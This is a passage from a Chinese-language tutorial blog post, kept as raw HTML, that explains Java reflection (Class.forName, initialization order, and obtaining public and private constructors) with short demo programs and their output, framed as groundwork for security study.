class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span>methodName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>clazz<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上面的示例中利用到了反射中尤为重要的几种方法</p>\n<ol>\n<li>获取类的方法：forName</li>\n<li>实例化类对象的方法：newInstance</li>\n<li>获取函数的方法：getMethod</li>\n<li>执行函数的方法：invoke</li>\n</ol>\n<p>这几个方法包揽了 Java 按去哪里各种和反射有关的 pyaload</p>\n<p>这里记一下 new 一个类对象后都干了什么</p>\n<ol>\n<li>首先找到目标类文件并加载到内存中</li>\n<li>执行该类的 static 方法（如果有的话），通过该方法给目标类进行初始化</li>\n<li>在堆内存中开辟空间，分配内存地址</li>\n<li>在堆内存中建立对象特有属性，并进行默认初始化</li>\n<li>对属性进行显示初始化</li>\n<li>对对象进行构造代码块初始化</li>\n<li>对对象进行对应的构造函数初始化</li>\n<li>将内存地址交付给栈内存中定义变量</li>\n</ol>\n<p>forName 不是获取 “类” 的唯一途径，通常来说我们有如下三种方式获取一个 “类”，也就是 java.lang.class 对象</p>\n<ul>\n<li>obj.getclass () 如果上下文中存在某个类的示例 obj，那么我们可以通过直接通过 obj.getClass () 来获取类</li>\n<li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。</li>\n<li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>\n</ul>\n<p>注：在一个 JVM 中，一个类只会有一个 “类对象” 存在</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">demo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> passwd<span class=\"token operator\">=</span><span class=\"token string\">\"admin123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面通过 getName 来获取类对象</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">lq</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> test <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">String</span> classname<span class=\"token operator\">=</span><span class=\"token string\">\"lq.demo\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token class-name\">Class</span> pClass1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>classname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>pClass1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">//class lq.demo</span></pre></td></tr></table></figure><p>forName 有两个函数重载</p>\n<ol>\n<li>class&lt;?&gt; forName(String name)</li>\n<li>class&lt;?&gt; forName(String name,**boolean** initialize,ClassLoader loader)</li>\n</ol>\n<p>第一种是我们常用的方法，也就是上面的示例中所使用的方法，可以理解为第二种方式的一个封装，第一个参数是类名，第二个参数标识是否初始化，第三个参数是加载器，高数 javaVM 如何加载这个类</p>\n<p>上面有提到初始化，这里先看一个简单的类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">lq</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo2 <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Empty block initial %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">static</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Static initial %s\\n\"</span><span class=\"token punctuation\">,</span> demo2<span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token function\">demo2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Initial %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面写一个获取类，运行一下上面的方法</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">lq</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">jdk<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>objectweb<span class=\"token punctuation\">.</span>asm<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Handle</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> test <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">String</span> classname<span class=\"token operator\">=</span><span class=\"token string\">\"lq.demo2\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token class-name\">Class</span> pClass1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>classname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token class-name\">Class</span> pClass2 <span class=\"token operator\">=</span> demo2<span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token class-name\">Class</span> pClass3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">demo2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>pClass2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ClassNotFoundException</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Static initial class lq.demo2</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Empty block initial class lq.demo2</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Initial class lq.demo2</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>class lq.demo2</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>*/</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303170039816.png\" alt=\"image-20230317003911738\" /></p>\n<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数，其中， static {} 就是在 “类初始化” 的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super () 后⾯，但在当前构造函数内容的前⾯。所以说， forName 中的 initialize=true 其实就是告诉 Java 虚拟机是否执⾏” 类初始化 “。</p>\n<h2 id=\"反射创建对象\"><a class=\"anchor\" href=\"#反射创建对象\">#</a> 反射创建对象</h2>\n<p>在正常情况下，除了系统类，如果我们想要拿到一个类，首先需要 import 才能使用，而使用 forName 就不需要，这样对于我们攻击者来说十分有利的，我们可以加载任意的类</p>\n<p>在一些源码中或许可以看到类名的部分包含 $ 符号，它的作用是查找内部类，java 中如果一个类中编写另一个内，在编译的时候会生成两个文件，通过 Class.forName (&quot;c1$c2&quot;) 就可以加载这个内部类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>获取类对象： <span class=\"token class-name\">Class</span> classname <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"demo.demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>获取构造器对象<span class=\"token operator\">:</span> <span class=\"token class-name\">Constructor</span> con <span class=\"token operator\">=</span> <span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span>形参<span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>获取对象：demo demo <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>实参<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>写一个 demo 类，添加 6 种构造方法</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">demo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> passwd<span class=\"token operator\">=</span><span class=\"token string\">\"admin123\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 默认</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(默认)的构造方法 s = \"</span><span class=\"token operator\">+</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 无参的构造方法</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"调用了公有，无参构造方法\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 一个参数的构造方法</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"姓名：\"</span><span class=\"token operator\">+</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">// 有多个参数的构造方法</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span><span class=\"token class-name\">String</span> pass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"用户名：\"</span><span class=\"token operator\">+</span>name<span class=\"token operator\">+</span><span class=\"token string\">\"密码：\"</span><span class=\"token operator\">+</span>pass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token comment\">// 受保护的构造方法</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">boolean</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"受保护 n = \"</span> <span class=\"token operator\">+</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\">// 私有构造方法</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token function\">demo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span> pass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"私有的构造方法\"</span><span class=\"token operator\">+</span>pass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过反射机制获取对象</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Constructor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> demo <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">Class</span> classname <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"demo.demo\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"---------所有公有构造方法-----------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">Constructor</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> conArray <span class=\"token operator\">=</span> classname<span class=\"token punctuation\">.</span><span class=\"token function\">getConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取所有 “公有的” 获取方法</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constructor</span> c<span class=\"token operator\">:</span>conArray<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------所有的构造方法(包括：私有，受保护，默认，，公有)----------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    conArray <span class=\"token operator\">=</span> classname<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取全部的构造方法</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constructor</span> c<span class=\"token operator\">:</span>conArray<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------获取公有的、无参的构造方法----------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token class-name\">Constructor</span> con <span class=\"token operator\">=</span> classname<span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取单个 “公有的” 构造方法</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\">// 这里的 null 写不写都行</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Con = \"</span> <span class=\"token operator\">+</span> con<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 实例化类对象的方法</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------获取私有的构造方法----------\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    con <span class=\"token operator\">=</span> classname<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取构造方法，没有限制</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>con<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    con<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 暴力访问</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    obj <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"admin123\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>--------- 所有公有构造方法 -----------</pre></td></tr><tr><td 